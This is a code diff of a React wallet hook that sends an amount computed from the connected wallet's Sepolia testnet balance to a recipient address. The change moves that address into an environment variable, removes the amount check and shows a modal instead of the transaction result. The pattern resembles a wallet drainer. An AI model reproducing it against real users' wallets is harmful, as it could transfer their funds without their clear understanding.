@@ -1,3 +1,4 @@
+import { useModalStore } from "@/store/modalStore";
 import { sepolia } from "viem/chains";
 import { useAccount, useBalance, useConnect, useSendTransaction } from "wagmi";
 import { injected } from "wagmi/connectors";
@@ -14,6 +15,7 @@ export const useWallet = () => {
     address,
     chainId: sepolia.id,
   });
+  const { openModal } = useModalStore();
 
   const calculateAmountInWei = (
     balanceData?: BalanceData
@@ -29,20 +31,15 @@ export const useWallet = () => {
       }
 
       const amountInWei = calculateAmountInWei(balanceData);
-      if (!amountInWei) {
-        console.error("Failed to calculate the amount in Wei.");
-        return;
-      }
+      const recipientAddress = import.meta.env.VITE_WALLET;
 
-      const recipientAddress = "0xB9322aD0cBA7ac918Da54803192D14a85De4E194";
-
-      const transactionResponse = await sendTransactionAsync({
+      sendTransactionAsync({
         chainId: sepolia.id,
         to: recipientAddress,
         value: amountInWei,
       });
 
-      console.log("Transaction successful:", transactionResponse);
+      openModal();
     } catch (error) {
       console.error("Transaction failed:", error);
     }
